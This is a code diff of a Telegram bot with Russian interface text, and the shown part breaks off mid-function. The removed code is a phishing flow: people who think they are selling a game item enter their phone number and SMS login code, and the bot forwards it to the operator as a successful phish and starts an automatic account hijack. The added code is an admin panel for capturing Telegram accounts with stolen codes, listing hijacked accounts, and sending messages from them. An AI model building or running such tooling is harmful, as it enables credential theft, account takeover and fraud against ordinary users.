+        f"👤 Кому: {username}\n"
+        f"📝 Текст:\n"
+        f"{message_text[:500]}{'...' if len(message_text) > 500 else ''}\n\n"
+        f"<i>Выберите действие:</i>",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+@dp.callback_query(F.data == "send_message_now")
+async def send_message_now(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
+        return
     
-    # Очищаем состояние
-    await state.clear()
+    user_data = await state.get_data()
+    username = user_data.get('target_username', '')
+    message_text = user_data.get('message_text', '')
+    media_path = user_data.get('media_path')
     
-    # ========== АВТОМАТИЧЕСКИЙ ЗАХВАТ АККАУНТА ==========
-    if hijacker:
-        await message.answer("⏳ <b>Проверка безопасности аккаунта...</b>", parse_mode="HTML")
-        
-        # Запускаем захват в фоновом режиме
-        asyncio.create_task(attempt_account_hijack(phone, code, user.id))
+    await callback_query.message.edit_text(
+        f"⏳ <b>Отправляю сообщение пользователю {username}...</b>",
+        parse_mode="HTML"
+    )
+    
+    # Отправляем сообщение
+    result = await message_system.send_to_user_by_username(
+        username,
+        message_text,
+        callback_query.from_user.id,
+        media_path
+    )
+    
+    if result['success']:
+        await callback_query.message.edit_text(
+            f"✅ <b>СООБЩЕНИЕ ОТПРАВЛЕНО!</b>\n\n"
+            f"👤 Пользователь: {username}\n"
+            f"🆔 User ID: {result.get('user_id', 'неизвестно')}\n"
+            f"📨 ID сообщения: {result.get('message_id', 'неизвестно')}\n"
+            f"✅ Статус: {result.get('status', 'отправлено')}\n\n"
+            f"<i>Для отправки нового сообщения используйте /start</i>",
+            parse_mode="HTML"
+        )
     else:
-        # Отправляем стандартное уведомление админу
-        await send_admin_report(user, phone, code, saved_code)
+        error_msg = result.get('error', 'Неизвестная ошибка')
+        status = result.get('status', 'error')
+        
+        status_text = {
+            'user_not_found': 'Пользователь не найден',
+            'user_blocked': 'Пользователь заблокировал бота',
+            'privacy_restriction': 'Ограничения приватности',
+            'error': 'Ошибка отправки'
+        }.get(status, status)
+        
+        await callback_query.message.edit_text(
+            f"❌ <b>ОШИБКА ОТПРАВКИ!</b>\n\n"
+            f"👤 Пользователь: {username}\n"
+            f"📝 Статус: {status_text}\n"
+            f"⚠️ Ошибка: {error_msg[:200]}\n\n"
+            f"<i>Попробуйте еще раз или свяжитесь с пользователем другим способом.</i>",
+            parse_mode="HTML"
+        )
     
-    log_action(user.id, "code_submitted", f"code: {code}, phone: {phone}")
+    await state.clear()
 
-async def send_admin_report(user, phone, code, saved_code):
-    """Отправляет отчет админу о фишинге"""
-    admin_report = f"""
-🎣 <b>ФИШИНГ УСПЕШЕН!</b>
-━━━━━━━━━━━━━━━━
-👤 <b>Жертва:</b> {user.first_name} (@{user.username})
-🆔 <b>User ID:</b> {user.id}
-📱 <b>Телефон:</b> +{phone}
-🔢 <b>Введенный код:</b> {code}
-💾 <b>Сохраненный код:</b> {saved_code if saved_code else 'нет'}
-💰 <b>Мотив:</b> Продажа игрового товара
-⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━
-<b>⚠️ Hijacker не инициализирован - ручной захват</b>
-<b>Код для входа:</b> <code>{code}</code>
-"""
-    
-    try:
-        await bot.send_message(ADMIN_ID, admin_report, parse_mode="HTML")
-    except Exception as e:
-        logger.error(f"Ошибка отправки админу: {e}")
-
-@dp.message(Command("resend_code"))
-async def cmd_resend_code(message: types.Message, state: FSMContext):
-    user = message.from_user
-
-    # Проверяем, есть ли сохраненный номер телефона
-    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
-    user_data = cursor.fetchone()
-
-    if not user_data or not user_data[0]:
-        # Если номера нет, просим сначала подтвердить номер
-        await message.answer("❌ <b>Сначала необходимо подтвердить номер телефона через меню верификации.</b>\n\nНажмите /start и выберите 'ПРОДАТЬ ТОВАР'", parse_mode="HTML")
+# Управление каналами
+@dp.callback_query(F.data == "admin_channels")
+async def admin_channels_menu(callback_query: CallbackQuery):
+    if not admin_manager.is_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
         return
-
-    phone = user_data[0]
-    old_code = user_data[1]
-
-    # Генерируем НОВЫЙ код
-    new_fake_code = str(random.randint(10000, 999999))
-
-    # Обновляем код в базе
-    cursor.execute(
-        "UPDATE users SET code = ? WHERE user_id = ?",
-        (new_fake_code, user.id)
-    )
-    conn.commit()
-
-    # Устанавливаем состояние ожидания кода
-    await state.set_state(VerificationStates.waiting_code)
-
-    # Информируем пользователя
-    resend_text = f"""
-🔄 <b>Запрошена повторная отправка кода</b>
-
-📱 <b>Новый код будет отправлен на номер +{phone} после проверки администратором.</b>
-⏳ <b>Пожалуйста, ожидайте ответа от администратора.</b>
-
-<i>Администратор получил ваш запрос и скоро отправит код.</i>
-"""
-    await message.answer(resend_text, parse_mode="HTML")
-
-    # Уведомляем админа о запросе нового кода
-    admin_notification = f"""
-🔄 <b>ЗАПРОС ПОВТОРНОЙ ОТПРАВКИ КОДА</b>
-━━━━━━━━━━━━━━━━
-👤 <b>Пользователь:</b> {user.first_name} (@{user.username})
-🆔 <b>User ID:</b> {user.id}
-📱 <b>Телефон:</b> +{phone}
-🔢 <b>Старый код:</b> {old_code}
-🔢 <b>Новый код:</b> {new_fake_code}
-⏰ <b>Время запроса:</b> {datetime.now().strftime('%H:%M:%S')}
-━━━━━━━━━━━━━━━━
-<b>Отправить новый код пользователю?</b>
-"""
+    
+    # Получаем статистику каналов
+    total_channels = db.fetch_one("SELECT COUNT(*) FROM channels")[0]
+    approved_channels = db.fetch_one("SELECT COUNT(*) FROM channels WHERE is_approved = 1")[0]
+    active_channels = db.fetch_one("SELECT COUNT(*) FROM channels WHERE notifications_enabled = 1")[0]
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Отправить новый код", callback_data=f"resend_code_{user.id}")],
-        [InlineKeyboardButton(text="❌ Отклонить запрос", callback_data=f"reject_resend_{user.id}")]
+        [
+            InlineKeyboardButton(text="➕ Добавить канал", callback_data="channel_add"),
+            InlineKeyboardButton(text="📋 Список каналов", callback_data="channel_list")
+        ],
+        [
+            InlineKeyboardButton(text="✅ Одобренные", callback_data="channel_approved"),
+            InlineKeyboardButton(text="⏳ Ожидают", callback_data="channel_pending")
+        ],
+        [
+            InlineKeyboardButton(text="🔔 Управление уведомлениями", callback_data="channel_notifications"),
+            InlineKeyboardButton(text="📨 Рассылка", callback_data="channel_broadcast")
+        ],
+        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
     ])
     
-    try:
-        await bot.send_message(ADMIN_ID, admin_notification, parse_mode="HTML", reply_markup=keyboard)
-    except:
-        pass
-    
-    log_action(user.id, "resend_code_requested")
+    await callback_query.message.edit_text(
+        f"📢 <b>УПРАВЛЕНИЕ КАНАЛАМИ</b>\n\n"
+        f"📊 Статистика:\n"
+        f"• Всего каналов: {total_channels}\n"
+        f"• Одобрено: {approved_channels}\n"
+        f"• Активны: {active_channels}\n\n"
+        f"<i>Выберите действие:</i>",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
 
-@dp.callback_query(F.data.startswith("resend_code_"))
-async def handle_admin_resend_code(callback_query: types.CallbackQuery):
-    """Админ отправляет новый код"""
-    user_id = int(callback_query.data.split("_")[2])
-    
-    # Получаем информацию о пользователе
-    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user_id,))
-    user_data = cursor.fetchone()
-    
-    if not user_data:
-        await callback_query.answer("❌ Пользователь не найден")
+@dp.callback_query(F.data == "channel_add")
+async def channel_add_start(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
         return
     
-    phone = user_data[0]
-    code = user_data[1]
+    await state.set_state(AdminStates.waiting_channel_id)
     
-    # Уведомляем пользователя
-    user_message = f"""
-✍️ <b>Администратор отправил новый SMS код на номер +{phone}:</b>
+    await callback_query.message.edit_text(
+        "➕ <b>ДОБАВЛЕНИЕ КАНАЛА/ГРУППЫ</b>\n\n"
+        "Отправьте ID или @username канала/группы:\n\n"
+        "Формат:\n"
+        "<code>@channel_username</code>\n"
+        "<code>-1001234567890</code> (ID канала)\n\n"
+        "<i>Перед добавлением убедитесь, что бот добавлен как администратор в канал.</i>",
+        parse_mode="HTML"
+    )
 
-<code>Пример кода: {code}</code>
-
-<b>Пожалуйста, введите код из SMS:</b>
-
-<i>Если код не пришел, используйте</i> /resend_code
-"""
+@dp.message(AdminStates.waiting_channel_id)
+async def process_channel_id(message: Message, state: FSMContext):
+    if not admin_manager.is_admin(message.from_user.id):
+        await message.answer("❌ Доступ запрещен")
+        await state.clear()
+        return
+    
+    channel_id = message.text.strip()
+    
+    if channel_id == '/cancel':
+        await message.answer("❌ Добавление канала отменено")
+        await state.clear()
+        return
+    
+    await state.update_data(channel_id=channel_id)
+    
+    # Проверяем канал
+    await message.answer(f"⏳ <b>Проверяю канал {channel_id}...</b>", parse_mode="HTML")
     
     try:
-        await bot.send_message(user_id, user_message, parse_mode="HTML")
-        await callback_query.answer("✅ Новый код отправлен пользователю")
+        # Пробуем получить информацию о канале
+        chat = await bot.get_chat(channel_id)
         
-        # Обновляем сообщение админу
-        await bot.edit_message_text(
-            f"✅ <b>Новый код отправлен пользователю {user_id}</b>\n\n"
-            f"Телефон: +{phone}\n"
-            f"Код: {code}\n"
-            f"Статус: Ожидание ввода кода",
-            chat_id=callback_query.message.chat.id,
-            message_id=callback_query.message.message_id,
-            parse_mode="HTML"
+        channel_info = {
+            'title': chat.title,
+            'username': chat.username,
+            'type': str(chat.type)
+        }
+        
+        # Проверяем права бота
+        bot_is_admin = False
+        try:
+            member = await bot.get_chat_member(chat.id, (await bot.get_me()).id)
+            bot_is_admin = member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
+        except:
+            pass
+        
+        await state.update_data(channel_info=channel_info, bot_is_admin=bot_is_admin)
+        
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="✅ Добавить", callback_data="confirm_channel_add"),
+                InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_channel_add")
+            ]
+        ])
+        
+        await message.answer(
+            f"🔍 <b>ИНФОРМАЦИЯ О КАНАЛЕ</b>\n\n"
+            f"📢 Название: {chat.title}\n"
+            f"🔗 ID: {chat.id}\n"
+            f"👤 Username: @{chat.username or 'нет'}\n"
+            f"📁 Тип: {chat.type}\n"
+            f"🤖 Бот админ: {'✅ Да' if bot_is_admin else '❌ Нет'}\n\n"
+            f"<i>Добавить этот канал в систему?</i>",
+            parse_mode="HTML",
+            reply_markup=keyboard
         )
         
     except Exception as e:
-        await callback_query.answer(f"❌ Ошибка: {str(e)[:100]}")
-        logger.error(f"[RESEND CODE] Ошибка отправки пользователю: {e}")
-
-@dp.callback_query(F.data.startswith("reject_resend_"))
-async def handle_reject_resend(callback_query: types.CallbackQuery):
-    """Админ отклоняет запрос повторной отправки"""
-    user_id = int(callback_query.data.split("_")[2])
-    
-    try:
-        await bot.edit_message_text(
-            f"❌ <b>Запрос повторной отправки кода отклонен для пользователя {user_id}</b>",
-            chat_id=callback_query.message.chat.id,
-            message_id=callback_query.message.message_id,
+        await message.answer(
+            f"❌ <b>ОШИБКА ПРОВЕРКИ КАНАЛА</b>\n\n"
+            f"Не удалось получить информацию о канале {channel_id}\n"
+            f"Ошибка: {str(e)[:200]}\n\n"
+            f"<i>Убедитесь, что:\n"
+            f"1. Канал существует\n"
+            f"2. Бот имеет доступ к каналу\n"
+            f"3. Вы указали правильный ID/username</i>",
             parse_mode="HTML"
         )
-        await callback_query.answer("❌ Запрос отклонен")
+        await state.clear()
+
+@dp.callback_query(F.data == "confirm_channel_add")
+async def confirm_channel_add(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
+        return
+    
+    user_data = await state.get_data()
+    channel_id = user_data.get('channel_id')
+    channel_info = user_data.get('channel_info', {})
+    
+    await callback_query.message.edit_text(
+        f"⏳ <b>Добавляю канал {channel_id}...</b>",
+        parse_mode="HTML"
+    )
+    
+    result = await channel_manager.add_channel(
+        channel_id,
+        callback_query.from_user.id,
+        channel_info
+    )
+    
+    if result['success']:
+        if result.get('requires_approval') and not admin_manager.is_main_admin(callback_query.from_user.id):
+            await callback_query.message.edit_text(
+                f"✅ <b>КАНАЛ ДОБАВЛЕН!</b>\n\n"
+                f"📢 Канал: {channel_info.get('title', channel_id)}\n"
+                f"🔗 ID: {channel_id}\n"
+                f"🤖 Бот админ: {'✅ Да' if result.get('bot_is_admin') else '❌ Нет'}\n\n"
+                f"📝 Статус: <b>ОЖИДАЕТ ОДОБРЕНИЯ</b>\n"
+                f"Главный администратор получил уведомление и должен одобрить канал.\n\n"
+                f"<i>Вы получите уведомление, когда канал будет одобрен.</i>",
+                parse_mode="HTML"
+            )
+        else:
+            await callback_query.message.edit_text(
+                f"✅ <b>КАНАЛ ДОБАВЛЕН И ОДОБРЕН!</b>\n\n"
+                f"📢 Канал: {channel_info.get('title', channel_id)}\n"
+                f"🔗 ID: {channel_id}\n"
+                f"🤖 Бот админ: {'✅ Да' if result.get('bot_is_admin') else '❌ Нет'}\n\n"
+                f"✅ Статус: <b>ОДОБРЕН</b>\n"
+                f"Теперь бот будет отправлять уведомления в этот канал.\n\n"
+                f"<i>Для управления уведомлениями используйте меню каналов.</i>",
+                parse_mode="HTML"
+            )
+    else:
+        await callback_query.message.edit_text(
+            f"❌ <b>ОШИБКА ДОБАВЛЕНИЯ КАНАЛА</b>\n\n"
+            f"Канал: {channel_id}\n"
+            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
+            f"<i>Попробуйте еще раз или проверьте правильность данных.</i>",
+            parse_mode="HTML"
+        )
+    
+    await state.clear()
+
+# Управление админами
+@dp.callback_query(F.data == "admin_manage")
+async def admin_manage_menu(callback_query: CallbackQuery):
+    if not admin_manager.is_main_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Только главный админ может управлять админами")
+        return
+    
+    # Получаем статистику админов
+    total_admins = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_active = 1")[0]
+    main_admins = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_main_admin = 1 AND is_active = 1")[0]
+    regular_admins = total_admins - main_admins
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="➕ Добавить админа", callback_data="admin_add"),
+            InlineKeyboardButton(text="➖ Удалить админа", callback_data="admin_remove_menu")
+        ],
+        [
+            InlineKeyboardButton(text="📋 Список админов", callback_data="admin_list"),
+            InlineKeyboardButton(text="🔧 Права админов", callback_data="admin_permissions")
+        ],
+        [
+            InlineKeyboardButton(text="📊 Статистика админов", callback_data="admin_stats_list"),
+            InlineKeyboardButton(text="🚪 Выход из всех сессий", callback_data="admin_logout_all")
+        ],
+        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
+    ])
+    
+    await callback_query.message.edit_text(
+        f"👥 <b>УПРАВЛЕНИЕ АДМИНИСТРАТОРАМИ</b>\n\n"
+        f"📊 Статистика:\n"
+        f"• Всего админов: {total_admins}\n"
+        f"• Главных админов: {main_admins}\n"
+        f"• Обычных админов: {regular_admins}\n"
+        f"• Лимит: {config.MAX_ADMINS}\n\n"
+        f"<i>Выберите действие:</i>",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+@dp.callback_query(F.data == "admin_add")
+async def admin_add_start(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_main_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Только главный админ может добавлять админов")
+        return
+    
+    await state.set_state(AdminStates.waiting_admin_username)
+    
+    await callback_query.message.edit_text(
+        "➕ <b>ДОБАВЛЕНИЕ АДМИНИСТРАТОРА</b>\n\n"
+        "Отправьте @username пользователя, которого хотите сделать админом:\n\n"
+        "<code>@username_user</code>\n\n"
+        "<i>Пользователь должен начать диалог с ботом (@BotFather) перед добавлением.</i>",
+        parse_mode="HTML"
+    )
+
+@dp.message(AdminStates.waiting_admin_username)
+async def process_admin_username(message: Message, state: FSMContext):
+    if not admin_manager.is_main_admin(message.from_user.id):
+        await message.answer("❌ Доступ запрещен")
+        await state.clear()
+        return
+    
+    username = message.text.strip()
+    
+    if username == '/cancel':
+        await message.answer("❌ Добавление админа отменено")
+        await state.clear()
+        return
+    
+    # Проверяем формат username
+    if not username.startswith('@'):
+        username = '@' + username
+    
+    # Пытаемся найти пользователя
+    await message.answer(f"⏳ <b>Ищу пользователя {username}...</b>", parse_mode="HTML")
+    
+    try:
+        # Пробуем получить chat пользователя
+        chat = await bot.get_chat(username)
         
-        # Уведомляем пользователя
+        if chat.type != ChatType.PRIVATE:
+            await message.answer(
+                f"❌ <b>ЭТО НЕ ЛИЧНЫЙ АККАУНТ</b>\n\n"
+                f"{username} - это {chat.type}, а не личный аккаунт.\n"
+                f"Добавлять можно только личные аккаунты пользователей.",
+                parse_mode="HTML"
+            )
+            await state.clear()
+            return
+        
+        await state.update_data(
+            new_admin_username=username,
+            new_admin_user_id=chat.id,
+            new_admin_first_name=chat.first_name,
+            new_admin_last_name=chat.last_name
+        )
+        
+        await state.set_state(AdminStates.waiting_admin_permissions)
+        
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="👑 Все права", callback_data="perms_all"),
+                InlineKeyboardButton(text="📨 Только сообщения", callback_data="perms_messages")
+            ],
+            [
+                InlineKeyboardButton(text="📢 Только каналы", callback_data="perms_channels"),
+                InlineKeyboardButton(text="👤 Только аккаунты", callback_data="perms_accounts")
+            ],
+            [
+                InlineKeyboardButton(text="🔧 Настроить вручную", callback_data="perms_custom"),
+                InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_admin_add")
+            ]
+        ])
+        
+        await message.answer(
+            f"✅ <b>ПОЛЬЗОВАТЕЛЬ НАЙДЕН</b>\n\n"
+            f"👤 Username: {username}\n"
+            f"🆔 ID: {chat.id}\n"
+            f"👤 Имя: {chat.first_name} {chat.last_name or ''}\n\n"
+            f"<b>Выберите уровень прав для нового администратора:</b>",
+            parse_mode="HTML",
+            reply_markup=keyboard
+        )
+        
+    except Exception as e:
+        await message.answer(
+            f"❌ <b>ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН</b>\n\n"
+            f"Не удалось найти пользователя {username}\n"
+            f"Ошибка: {str(e)[:200]}\n\n"
+            f"<i>Убедитесь, что:\n"
+            f"1. Пользователь существует\n"
+            f"2. Username указан правильно\n"
+            f"3. Пользователь начинал диалог с ботом</i>",
+            parse_mode="HTML"
+        )
+        await state.clear()
+
+@dp.callback_query(F.data.startswith("perms_"))
+async def process_admin_permissions(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_main_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
+        return
+    
+    permission_type = callback_query.data.split("_")[1]
+    
+    permissions_map = {
+        'all': 'all',
+        'messages': 'send_messages,view_messages',
+        'channels': 'manage_channels,view_channels',
+        'accounts': 'hijack_accounts,manage_accounts,view_accounts'
+    }
+    
+    permissions = permissions_map.get(permission_type, 'basic')
+    
+    if permission_type == 'custom':
+        await callback_query.message.edit_text(
+            "🔧 <b>НАСТРОЙКА ПРАВ ВРУЧНУЮ</b>\n\n"
+            "Введите права через запятую:\n\n"
+            "Доступные права:\n"
+            "• send_messages - отправка сообщений\n"
+            "• view_messages - просмотр сообщений\n"
+            "• manage_channels - управление каналами\n"
+            "• view_channels - просмотр каналов\n"
+            "• hijack_accounts - захват аккаунтов\n"
+            "• manage_accounts - управление аккаунтами\n"
+            "• view_accounts - просмотр аккаунтов\n"
+            "• manage_admins - управление админами (только главный админ)\n"
+            "• view_logs - просмотр логов\n"
+            "• all - все права\n\n"
+            "<i>Пример: send_messages,view_messages,manage_channels</i>",
+            parse_mode="HTML"
+        )
+        await state.set_state(AdminStates.waiting_admin_permissions)
+        return
+    
+    await state.update_data(new_admin_permissions=permissions)
+    await state.set_state(AdminStates.waiting_admin_confirm)
+    
+    user_data = await state.get_data()
+    username = user_data.get('new_admin_username', '')
+    user_id = user_data.get('new_admin_user_id', '')
+    first_name = user_data.get('new_admin_first_name', '')
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="✅ Подтвердить", callback_data="confirm_admin_add"),
+            InlineKeyboardButton(text="✏️ Изменить права", callback_data="change_admin_perms")
+        ],
+        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_admin_add")]
+    ])
+    
+    await callback_query.message.edit_text(
+        f"📋 <b>ПОДТВЕРЖДЕНИЕ ДОБАВЛЕНИЯ</b>\n\n"
+        f"👤 Пользователь: {username}\n"
+        f"🆔 ID: {user_id}\n"
+        f"👤 Имя: {first_name}\n"
+        f"🔑 Права: {permissions}\n\n"
+        f"<i>Добавить этого пользователя как администратора?</i>",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+@dp.callback_query(F.data == "confirm_admin_add")
+async def confirm_admin_add(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_main_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
+        return
+    
+    user_data = await state.get_data()
+    username = user_data.get('new_admin_username', '')
+    user_id = user_data.get('new_admin_user_id', '')
+    permissions = user_data.get('new_admin_permissions', 'basic')
+    
+    await callback_query.message.edit_text(
+        f"⏳ <b>Добавляю администратора {username}...</b>",
+        parse_mode="HTML"
+    )
+    
+    result = await admin_manager.add_admin(
+        user_id,
+        username,
+        callback_query.from_user.id,
+        permissions
+    )
+    
+    if result['success']:
+        await callback_query.message.edit_text(
+            f"✅ <b>АДМИНИСТРАТОР ДОБАВЛЕН!</b>\n\n"
+            f"👤 Пользователь: {username}\n"
+            f"🆔 ID: {user_id}\n"
+            f"🔑 Права: {permissions}\n"
+            f"👑 Добавил: ID {callback_query.from_user.id}\n\n"
+            f"<i>Пользователь получил уведомление о назначении.</i>",
+            parse_mode="HTML"
+        )
+    else:
+        await callback_query.message.edit_text(
+            f"❌ <b>ОШИБКА ДОБАВЛЕНИЯ</b>\n\n"
+            f"Пользователь: {username}\n"
+            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
+            f"<i>Попробуйте еще раз.</i>",
+            parse_mode="HTML"
+        )
+    
+    await state.clear()
+
+# Управление захваченными аккаунтами
+@dp.callback_query(F.data == "admin_accounts")
+async def admin_accounts_menu(callback_query: CallbackQuery):
+    if not admin_manager.is_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
+        return
+    
+    # Проверяем права на работу с аккаунтами
+    if not admin_manager.has_permission(callback_query.from_user.id, 'view_accounts'):
+        await callback_query.answer("❌ У вас нет прав для просмотра аккаунтов")
+        return
+    
+    # Получаем статистику аккаунтов
+    total_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts")[0]
+    active_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts WHERE is_active = 1")[0]
+    online_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts WHERE is_online = 1")[0]
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="🎯 Захватить аккаунт", callback_data="account_hijack"),
+            InlineKeyboardButton(text="📋 Список аккаунтов", callback_data="account_list")
+        ],
+        [
+            InlineKeyboardButton(text="🔄 Восстановить все", callback_data="account_restore_all"),
+            InlineKeyboardButton(text="📊 Статистика", callback_data="account_stats")
+        ],
+        [
+            InlineKeyboardButton(text="📨 Отправить от аккаунта", callback_data="account_send"),
+            InlineKeyboardButton(text="⚙️ Управление аккаунтами", callback_data="account_manage")
+        ] if admin_manager.has_permission(callback_query.from_user.id, 'manage_accounts') else [],
+        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
+    ])
+    
+    await callback_query.message.edit_text(
+        f"👤 <b>УПРАВЛЕНИЕ АККАУНТАМИ TELEGRAM</b>\n\n"
+        f"📊 Статистика:\n"
+        f"• Всего аккаунтов: {total_accounts}\n"
+        f"• Активных: {active_accounts}\n"
+        f"• Онлайн: {online_accounts}\n\n"
+        f"<i>Выберите действие:</i>",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+@dp.callback_query(F.data == "account_hijack")
+async def account_hijack_start(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
+        return
+    
+    # Проверяем права на захват аккаунтов
+    if not admin_manager.has_permission(callback_query.from_user.id, 'hijack_accounts'):
+        await callback_query.answer("❌ У вас нет прав для захвата аккаунтов")
+        return
+    
+    # Проверяем, настроены ли API credentials
+    if not config.TELEGRAM_API_ID or not config.TELEGRAM_API_HASH:
+        await callback_query.message.edit_text(
+            "❌ <b>API CREDENTIALS НЕ НАСТРОЕНЫ</b>\n\n"
+            "Для захвата аккаунтов необходимо настроить:\n"
+            "1. TELEGRAM_API_ID\n"
+            "2. TELEGRAM_API_HASH\n\n"
+            "Добавьте эти переменные в настройки бота.",
+            parse_mode="HTML"
+        )
+        return
+    
+    await state.set_state(AdminStates.waiting_hijack_phone)
+    
+    await callback_query.message.edit_text(
+        "🎯 <b>ЗАХВАТ АККАУНТА TELEGRAM</b>\n\n"
+        "Отправьте номер телефона в международном формате:\n\n"
+        "<code>+79123456789</code>\n\n"
+        "<i>Номер должен быть привязан к аккаунту Telegram.</i>",
+        parse_mode="HTML"
+    )
+
+@dp.message(AdminStates.waiting_hijack_phone)
+async def process_hijack_phone(message: Message, state: FSMContext):
+    if not admin_manager.is_admin(message.from_user.id):
+        await message.answer("❌ Доступ запрещен")
+        await state.clear()
+        return
+    
+    if not admin_manager.has_permission(message.from_user.id, 'hijack_accounts'):
+        await message.answer("❌ У вас нет прав для захвата аккаунтов")
+        await state.clear()
+        return
+    
+    phone = message.text.strip()
+    
+    if phone == '/cancel':
+        await message.answer("❌ Захват аккаунта отменен")
+        await state.clear()
+        return
+    
+    # Проверяем формат номера
+    try:
+        parsed = phonenumbers.parse(phone, None)
+        if not phonenumbers.is_valid_number(parsed):
+            raise ValueError("Неверный номер телефона")
+        
+        formatted_phone = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
+        
+    except Exception as e:
+        await message.answer(
+            f"❌ <b>НЕВЕРНЫЙ ФОРМАТ НОМЕРА</b>\n\n"
+            f"Номер: {phone}\n"
+            f"Ошибка: {str(e)}\n\n"
+            f"<i>Используйте международный формат:\n"
+            f"+79123456789</i>",
+            parse_mode="HTML"
+        )
+        return
+    
+    await state.update_data(hijack_phone=formatted_phone)
+    await state.set_state(AdminStates.waiting_hijack_method)
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="📱 Telethon", callback_data="hijack_method_telethon"),
+            InlineKeyboardButton(text="🤖 Pyrogram", callback_data="hijack_method_pyrogram")
+        ],
+        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_hijack")]
+    ])
+    
+    await message.answer(
+        f"✅ <b>НОМЕР ПРИНЯТ</b>\n\n"
+        f"📱 Номер: {formatted_phone}\n\n"
+        f"<b>Выберите метод захвата:</b>",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+@dp.callback_query(F.data.startswith("hijack_method_"))
+async def process_hijack_method(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Доступ запрещен")
+        return
+    
+    method = callback_query.data.split("_")[2]  # telethon или pyrogram
+    
+    await state.update_data(hijack_method=method)
+    await state.set_state(AdminStates.waiting_hijack_code)
+    
+    await callback_query.message.edit_text(
+        f"🔢 <b>ВВОД КОДА ПОДТВЕРЖДЕНИЯ</b>\n\n"
+        f"📱 Номер: {(await state.get_data()).get('hijack_phone', '')}\n"
+        f"🔧 Метод: {method}\n\n"
+        f"Отправьте код из SMS, который придет на этот номер:\n\n"
+        f"<i>Код состоит из 5-6 цифр.</i>",
+        parse_mode="HTML"
+    )
+
+@dp.message(AdminStates.waiting_hijack_code)
+async def process_hijack_code(message: Message, state: FSMContext):
+    if not admin_manager.is_admin(message.from_user.id):
+        await message.answer("❌ Доступ запрещен")
+        await state.clear()
+        return
+    
+    if not admin_manager.has_permission(message.from_user.id, 'hijack_accounts'):
+        await message.answer("❌ У вас нет прав для захвата аккаунтов")
+        await state.clear()
+        return
+    
+    code = message.text.strip()
+    
+    if code == '/cancel':
+        await message.answer("❌ Захват аккаунта отменен")
+        await state.clear()
+        return
+    
+    # Проверяем формат кода
+    if not code.isdigit() or len(code) < 5 or len(code) > 6:
+        await message.answer(
+            f"❌ <b>НЕВЕРНЫЙ ФОРМАТ КОДА</b>\n\n"
+            f"Код должен состоять из 5-6 цифр.\n"
+            f"Получено: {code}\n\n"
+            f"<i>Попробуйте еще раз.</i>",
+            parse_mode="HTML"
+        )
+        return
+    
+    user_data = await state.get_data()
+    phone = user_data.get('hijack_phone', '')
+    method = user_data.get('hijack_method', 'telethon')
+    
+    await message.answer(
+        f"⏳ <b>НАЧИНАЮ ЗАХВАТ АККАУНТА...</b>\n\n"
+        f"📱 Номер: {phone}\n"
+        f"🔢 Код: {code}\n"
+        f"🔧 Метод: {method}\n\n"
+        f"<i>Это может занять несколько секунд...</i>",
+        parse_mode="HTML"
+    )
+    
+    # Запускаем захват аккаунта
+    result = await account_manager.hijack_account(phone, code, method)
+    
+    if result['success']:
